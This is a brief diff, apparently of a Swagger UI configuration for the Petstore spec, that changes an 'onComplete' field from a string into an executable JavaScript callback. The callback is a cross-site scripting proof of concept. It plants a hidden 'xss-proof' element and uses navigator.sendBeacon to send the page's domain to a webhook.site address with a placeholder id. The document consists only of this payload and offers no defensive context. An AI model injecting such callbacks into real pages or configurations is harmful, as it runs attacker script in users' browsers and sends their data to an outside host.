@@ -1,6 +1,6 @@
 {
   "url": "https://petstore.swagger.io/v2/swagger.json",
-  "onComplete": "() => { 
+  "onComplete": () => { 
     // Create invisible proof element
     const marker = document.createElement('div');
     marker.id = 'xss-proof';
@@ -10,5 +10,5 @@
     
     // Send beacon to webhook
     navigator.sendBeacon('https://webhook.site/your-unique-id', document.domain);
-  }"
+  }
 }
